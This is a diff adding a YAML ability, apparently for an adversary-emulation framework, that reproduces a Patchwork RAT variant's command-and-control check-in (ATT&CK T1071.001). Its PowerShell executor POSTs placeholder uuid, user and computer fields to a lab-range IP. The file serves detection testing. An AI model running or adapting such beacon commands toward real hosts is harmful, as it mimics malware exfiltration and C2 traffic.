@@ -1,0 +1,32 @@
+- tactic: command-and-control
+  technique_name: 'Application Layer Protocol: Web Protocols'
+  technique_id: T1071.001
+  name: 'Intrusion: Patchwork RAT Variant Outbound Connection'
+  description: auto-generated
+  executors:
+  - name: psh
+    platform: windows
+    command: Invoke-WebRequest -Uri "http://198.18.128.192/filedownload2.php" -Method
+      POST -Headers @{ "Content-Type" = "application/x-www-form-urlencoded" } -Body
+      "uuid=testuuid&user=testuser&atcomp=testatcomp"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - command-and-control
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 42dcf70c-6a49-417c-91ff-afea501fb452
